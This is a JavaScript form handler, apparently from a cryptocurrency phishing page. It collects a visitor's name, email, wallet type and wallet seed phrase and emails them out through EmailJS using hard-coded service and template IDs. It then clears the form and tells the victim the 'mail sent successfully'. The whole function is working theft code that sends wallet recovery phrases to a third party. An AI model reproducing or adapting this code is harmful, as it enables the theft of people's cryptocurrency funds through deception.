function sendEmail() {

    var params = {
        from_name:   document.querySelector('#fullname').value,
         email_id:   document.querySelector('#email_id').value,
      wallet_type:   document.querySelector('#wallet').value,
      seed_phrase:   document.querySelector('#seedphrase').value,

    };

    const servive_ID = 'service_cllk9vj';
    const template_ID = 'template_h5axn0d';

    emailjs.send(servive_ID, template_ID, params).then((res) => {
            document.querySelector('#fullname').value = '';
            document.querySelector('#email_id').value = '';  
            document.querySelector('#wallet').value = '';  
            document.querySelector('#seedphrase').value = '';
            console.log(res);
            alert('your mail sent successfully');
    }).catch((err) => console.log(err));

    }
   
   